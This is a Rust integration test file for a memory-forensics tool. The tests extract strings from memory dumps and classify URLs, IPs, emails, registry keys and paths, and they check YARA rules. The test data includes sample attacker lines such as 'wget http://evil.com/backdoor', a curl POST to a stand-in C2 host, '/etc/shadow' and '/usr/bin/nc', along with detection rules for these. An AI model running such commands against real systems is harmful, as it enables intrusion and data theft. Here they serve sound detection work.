//! End-to-end integration tests for the memf pipeline.

use memf_format::test_builders::{AvmlBuilder, ElfCoreBuilder, LimeBuilder};
use memf_format::PhysicalMemoryProvider;
use memf_strings::classify::classify_strings;
use memf_strings::extract::{extract_strings, ExtractConfig};
use memf_strings::{ClassifiedString, StringCategory, StringEncoding};

#[test]
fn lime_extract_and_classify_url() {
    let mut data = vec![0u8; 256];
    let url = b"https://malware.example.com/shell.elf";
    data[32..32 + url.len()].copy_from_slice(url);

    let dump = LimeBuilder::new().add_range(0x1000, &data).build();
    let provider = memf_format::lime::LimeProvider::from_bytes(&dump).unwrap();

    let config = ExtractConfig {
        min_length: 4,
        ascii: true,
        utf16le: false,
    };
    let mut strings = extract_strings(&provider, &config);
    classify_strings(&mut strings);

    let url_matches: Vec<_> = strings
        .iter()
        .filter(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::Url))
        .collect();
    assert_eq!(url_matches.len(), 1);
    assert!(url_matches[0].value.contains("malware.example.com"));
}

#[test]
fn avml_extract_and_classify_ip() {
    let mut data = vec![0u8; 256];
    let ip = b"192.168.1.100";
    data[64..64 + ip.len()].copy_from_slice(ip);

    let dump = AvmlBuilder::new().add_range(0x2000, &data).build();
    let provider = memf_format::avml::AvmlProvider::from_bytes(&dump).unwrap();

    let mut strings = extract_strings(&provider, &ExtractConfig::default());
    classify_strings(&mut strings);

    let ip_matches: Vec<_> = strings
        .iter()
        .filter(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::IpV4))
        .collect();
    assert!(!ip_matches.is_empty());
}

#[test]
fn from_file_and_classify() {
    use std::io::Write;

    let path = std::env::temp_dir().join("memf_integration_strings");
    {
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "https://c2.evil.org/beacon").unwrap();
        writeln!(f, "192.168.0.1").unwrap();
        writeln!(f, "user@example.com").unwrap();
        writeln!(f, "random garbage text").unwrap();
        writeln!(f, "/etc/shadow").unwrap();
    }

    let mut strings = memf_strings::from_file::from_strings_file(&path).unwrap();
    classify_strings(&mut strings);

    let classified: Vec<_> = strings
        .iter()
        .filter(|s| !s.categories.is_empty())
        .collect();
    assert!(
        classified.len() >= 4,
        "expected >= 4 classified, got {}",
        classified.len()
    );

    std::fs::remove_file(&path).ok();
}

#[test]
fn yara_classifier_with_custom_rule() {
    let rule = r#"
rule suspicious_powershell {
    strings:
        $ps = "powershell" nocase
    condition:
        $ps
}
"#;
    let classifier = memf_strings::yara_classifier::YaraClassifier::from_source(rule).unwrap();
    let matches = classifier.scan_string("powershell -enc ZWNobyBoZWxsbw==");
    assert_eq!(matches.len(), 1);
    assert!(
        matches!(matches[0].0, StringCategory::YaraMatch(ref name) if name == "suspicious_powershell")
    );
}

// ---------------------------------------------------------------------------
// Test 1: Raw format dump -> extract strings -> classify -> verify
// ---------------------------------------------------------------------------
#[test]
fn raw_format_extract_and_classify() {
    let mut data = vec![0u8; 512];
    let url = b"https://raw.evil.net/payload";
    data[100..100 + url.len()].copy_from_slice(url);

    let provider = memf_format::raw::RawProvider::from_bytes(&data);
    assert_eq!(provider.format_name(), "Raw");

    let config = ExtractConfig {
        min_length: 4,
        ascii: true,
        utf16le: false,
    };
    let mut strings = extract_strings(&provider, &config);
    classify_strings(&mut strings);

    let url_matches: Vec<_> = strings
        .iter()
        .filter(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::Url))
        .collect();
    assert_eq!(url_matches.len(), 1);
    assert!(url_matches[0].value.contains("raw.evil.net"));
}

// ---------------------------------------------------------------------------
// Test 2: ELF core dump -> extract strings -> classify -> verify
// ---------------------------------------------------------------------------
#[test]
fn elf_core_extract_and_classify() {
    let mut data = vec![0u8; 4096];
    let email = b"admin@malicious-domain.org";
    data[200..200 + email.len()].copy_from_slice(email);

    let dump = ElfCoreBuilder::new().add_segment(0x5000, &data).build();
    let provider = memf_format::elf_core::ElfCoreProvider::from_bytes(dump).unwrap();

    let config = ExtractConfig {
        min_length: 4,
        ascii: true,
        utf16le: false,
    };
    let mut strings = extract_strings(&provider, &config);
    classify_strings(&mut strings);

    let email_matches: Vec<_> = strings
        .iter()
        .filter(|s| {
            s.categories
                .iter()
                .any(|(c, _)| *c == StringCategory::Email)
        })
        .collect();
    assert!(
        !email_matches.is_empty(),
        "should detect email in ELF core dump"
    );
    assert!(email_matches[0]
        .value
        .contains("admin@malicious-domain.org"));
}

// ---------------------------------------------------------------------------
// Test 3: UTF-16LE string extraction pipeline
// ---------------------------------------------------------------------------
#[test]
fn utf16le_string_extraction_pipeline() {
    // Encode a URL as UTF-16LE: each ASCII char becomes 2 bytes (char, 0x00)
    let test_str = "https://utf16.example.com/test";
    let utf16_bytes: Vec<u8> = test_str
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let mut data = vec![0u8; 512];
    data[64..64 + utf16_bytes.len()].copy_from_slice(&utf16_bytes);

    let dump = LimeBuilder::new().add_range(0x3000, &data).build();
    let provider = memf_format::lime::LimeProvider::from_bytes(&dump).unwrap();

    let config = ExtractConfig {
        min_length: 4,
        ascii: false,
        utf16le: true,
    };
    let strings = extract_strings(&provider, &config);

    let utf16_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.encoding == StringEncoding::Utf16Le)
        .collect();
    assert!(
        !utf16_strings.is_empty(),
        "should extract at least one UTF-16LE string"
    );
    assert!(
        utf16_strings
            .iter()
            .any(|s| s.value.contains("utf16.example.com")),
        "UTF-16LE extracted string should contain the test URL"
    );
}

// ---------------------------------------------------------------------------
// Test 4: YARA rules from directory
// ---------------------------------------------------------------------------
#[test]
fn yara_rules_from_directory() {
    use std::io::Write;

    let dir = std::env::temp_dir().join("memf_yara_dir_test");
    std::fs::create_dir_all(&dir).unwrap();

    // Write two .yar files
    let rule1_path = dir.join("rule1.yar");
    {
        let mut f = std::fs::File::create(&rule1_path).unwrap();
        write!(
            f,
            r#"
rule detect_wget {{
    strings:
        $wget = "wget" nocase
    condition:
        $wget
}}
"#
        )
        .unwrap();
    }

    let rule2_path = dir.join("rule2.yara");
    {
        let mut f = std::fs::File::create(&rule2_path).unwrap();
        write!(
            f,
            r#"
rule detect_curl {{
    strings:
        $curl = "curl" nocase
    condition:
        $curl
}}
"#
        )
        .unwrap();
    }

    let classifier = memf_strings::yara_classifier::YaraClassifier::from_rules_dir(&dir).unwrap();

    let wget_matches = classifier.scan_string("wget http://evil.com/backdoor");
    assert_eq!(wget_matches.len(), 1);
    assert!(matches!(&wget_matches[0].0, StringCategory::YaraMatch(name) if name == "detect_wget"));

    let curl_matches = classifier.scan_string("curl -X POST http://c2.attacker.org");
    assert_eq!(curl_matches.len(), 1);
    assert!(matches!(&curl_matches[0].0, StringCategory::YaraMatch(name) if name == "detect_curl"));

    // Clean up
    std::fs::remove_file(&rule1_path).ok();
    std::fs::remove_file(&rule2_path).ok();
    std::fs::remove_dir(&dir).ok();
}

// ---------------------------------------------------------------------------
// Test 5: Multiple classifiers pipeline (all categories)
// ---------------------------------------------------------------------------
#[test]
fn multiple_classifiers_pipeline() {
    use std::io::Write;

    let path = std::env::temp_dir().join("memf_multi_classify_test");
    {
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "https://c2.evil.org/beacon").unwrap();
        writeln!(f, "10.0.0.1").unwrap();
        writeln!(f, "attacker@evil.com").unwrap();
        writeln!(f, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
        writeln!(f, "/usr/bin/nc").unwrap();
    }

    let mut strings = memf_strings::from_file::from_strings_file(&path).unwrap();
    classify_strings(&mut strings);

    // URL
    assert!(
        strings
            .iter()
            .any(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::Url)),
        "should classify URL"
    );
    // IPv4
    assert!(
        strings
            .iter()
            .any(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::IpV4)),
        "should classify IPv4"
    );
    // Email
    assert!(
        strings.iter().any(|s| s
            .categories
            .iter()
            .any(|(c, _)| *c == StringCategory::Email)),
        "should classify Email"
    );
    // Registry key
    assert!(
        strings.iter().any(|s| s
            .categories
            .iter()
            .any(|(c, _)| *c == StringCategory::RegistryKey)),
        "should classify RegistryKey"
    );
    // Unix path
    assert!(
        strings.iter().any(|s| s
            .categories
            .iter()
            .any(|(c, _)| *c == StringCategory::UnixPath)),
        "should classify UnixPath"
    );

    std::fs::remove_file(&path).ok();
}

// ---------------------------------------------------------------------------
// Test 6: Format auto-detection for LiME
// ---------------------------------------------------------------------------
#[test]
fn format_auto_detection_lime() {
    let dump = LimeBuilder::new().add_range(0x1000, &[0xCC; 256]).build();
    let path = std::env::temp_dir().join("memf_autodetect_lime_e2e");
    std::fs::write(&path, &dump).unwrap();

    let provider = memf_format::open_dump(&path).unwrap();
    assert_eq!(provider.format_name(), "LiME");

    std::fs::remove_file(&path).ok();
}

// ---------------------------------------------------------------------------
// Test 7: Format auto-detection for AVML
// ---------------------------------------------------------------------------
#[test]
fn format_auto_detection_avml() {
    let dump = AvmlBuilder::new().add_range(0x2000, &[0xDD; 256]).build();
    let path = std::env::temp_dir().join("memf_autodetect_avml_e2e");
    std::fs::write(&path, &dump).unwrap();

    let provider = memf_format::open_dump(&path).unwrap();
    assert_eq!(provider.format_name(), "AVML v2");

    std::fs::remove_file(&path).ok();
}

// ---------------------------------------------------------------------------
// Test 8: Raw format via RawProvider (open_dump does not auto-detect raw since
//         RawPlugin probe score is below the 20 threshold, so we test
//         RawProvider::from_path directly, which is the intended usage)
// ---------------------------------------------------------------------------
#[test]
fn format_auto_detection_raw() {
    let data = vec![0x42u8; 512];
    let path = std::env::temp_dir().join("memf_autodetect_raw_e2e");
    std::fs::write(&path, &data).unwrap();

    // open_dump should return UnknownFormat for raw data (probe score 5 < 20)
    let result = memf_format::open_dump(&path);
    assert!(
        result.is_err(),
        "raw data should not be auto-detected by open_dump"
    );

    // Direct construction via RawProvider::from_path works
    let provider = memf_format::raw::RawProvider::from_path(&path).unwrap();
    assert_eq!(provider.format_name(), "Raw");
    assert_eq!(provider.total_size(), 512);

    let mut buf = [0u8; 4];
    let n = provider.read_phys(0, &mut buf).unwrap();
    assert_eq!(n, 4);
    assert_eq!(buf, [0x42; 4]);

    std::fs::remove_file(&path).ok();
}

// ---------------------------------------------------------------------------
// Test 9: Strings CSV output format
// ---------------------------------------------------------------------------
#[test]
fn strings_csv_output_format() {
    let mut strings = vec![ClassifiedString {
        value: "https://csv-test.example.com".to_string(),
        physical_offset: 0x1234,
        encoding: StringEncoding::Ascii,
        categories: vec![(StringCategory::Url, 0.95)],
    }];
    classify_strings(&mut strings);

    // Verify CSV formatting matches the expected pattern from main.rs:
    // offset,encoding,categories,value
    let s = &strings[0];
    let cats: Vec<String> = s.categories.iter().map(|(c, _)| format!("{c:?}")).collect();
    let escaped_value = s.value.replace('"', "\"\"");
    let csv_line = format!(
        "{:#010x},{:?},{},\"{}\"",
        s.physical_offset,
        s.encoding,
        cats.join(";"),
        escaped_value
    );

    assert!(csv_line.starts_with("0x00001234,"));
    assert!(csv_line.contains("Ascii"));
    assert!(csv_line.contains("Url"));
    assert!(csv_line.contains("\"https://csv-test.example.com\""));

    // Verify header format
    let header = "offset,encoding,categories,value";
    assert_eq!(header.split(',').count(), 4);
}

// ---------------------------------------------------------------------------
// Test 10: Strings JSON output format
// ---------------------------------------------------------------------------
#[test]
fn strings_json_output_format() {
    let mut strings = vec![ClassifiedString {
        value: "192.168.100.50".to_string(),
        physical_offset: 0xABCD,
        encoding: StringEncoding::Ascii,
        categories: vec![(StringCategory::IpV4, 0.99)],
    }];
    classify_strings(&mut strings);

    // Replicate the JSON format from main.rs print_strings_json
    let s = &strings[0];
    let json = serde_json::json!({
        "offset": s.physical_offset,
        "encoding": format!("{:?}", s.encoding),
        "value": s.value,
        "categories": s.categories.iter().map(|(c, conf)| {
            serde_json::json!({"category": format!("{c:?}"), "confidence": conf})
        }).collect::<Vec<_>>(),
    });

    let json_str = serde_json::to_string(&json).unwrap();

    // Parse it back to verify it's valid JSON
    let parsed: serde_json::Value = serde_json::from_str(&json_str).unwrap();
    assert_eq!(parsed["offset"], 0xABCD);
    assert_eq!(parsed["encoding"], "Ascii");
    assert_eq!(parsed["value"], "192.168.100.50");
    assert!(parsed["categories"].is_array());
    assert!(!parsed["categories"].as_array().unwrap().is_empty());
    assert!(parsed["categories"][0]["category"]
        .as_str()
        .unwrap()
        .contains("IpV4"));
    assert!(parsed["categories"][0]["confidence"].is_number());
}

// ---------------------------------------------------------------------------
// Test 17: All formats round trip
// ---------------------------------------------------------------------------
#[test]
fn all_formats_round_trip() {
    let test_data = vec![0xAB; 4096];

    // LiME: create -> open -> read -> verify
    {
        let dump = LimeBuilder::new().add_range(0x1000, &test_data).build();
        let path = std::env::temp_dir().join("memf_roundtrip_lime");
        std::fs::write(&path, &dump).unwrap();
        let provider = memf_format::open_dump(&path).unwrap();
        assert_eq!(provider.format_name(), "LiME");
        let mut buf = [0u8; 16];
        let n = provider.read_phys(0x1000, &mut buf).unwrap();
        assert_eq!(n, 16);
        assert_eq!(buf, [0xAB; 16]);
        std::fs::remove_file(&path).ok();
    }

    // AVML: create -> open -> read -> verify
    {
        let dump = AvmlBuilder::new().add_range(0x2000, &test_data).build();
        let path = std::env::temp_dir().join("memf_roundtrip_avml");
        std::fs::write(&path, &dump).unwrap();
        let provider = memf_format::open_dump(&path).unwrap();
        assert_eq!(provider.format_name(), "AVML v2");
        let mut buf = [0u8; 16];
        let n = provider.read_phys(0x2000, &mut buf).unwrap();
        assert_eq!(n, 16);
        assert_eq!(buf, [0xAB; 16]);
        std::fs::remove_file(&path).ok();
    }

    // ELF Core: create -> open -> read -> verify
    {
        let dump = ElfCoreBuilder::new()
            .add_segment(0x3000, &test_data)
            .build();
        let path = std::env::temp_dir().join("memf_roundtrip_elfcore");
        std::fs::write(&path, &dump).unwrap();
        let provider = memf_format::open_dump(&path).unwrap();
        assert_eq!(provider.format_name(), "ELF Core");
        let mut buf = [0u8; 16];
        let n = provider.read_phys(0x3000, &mut buf).unwrap();
        assert_eq!(n, 16);
        assert_eq!(buf, [0xAB; 16]);
        std::fs::remove_file(&path).ok();
    }

    // Raw: create -> open via RawProvider::from_path -> read -> verify
    // (open_dump does not auto-detect raw; RawPlugin probe score is below threshold)
    {
        let path = std::env::temp_dir().join("memf_roundtrip_raw");
        std::fs::write(&path, &test_data).unwrap();
        let provider = memf_format::raw::RawProvider::from_path(&path).unwrap();
        assert_eq!(provider.format_name(), "Raw");
        let mut buf = [0u8; 16];
        let n = provider.read_phys(0, &mut buf).unwrap();
        assert_eq!(n, 16);
        assert_eq!(buf, [0xAB; 16]);
        std::fs::remove_file(&path).ok();
    }
}
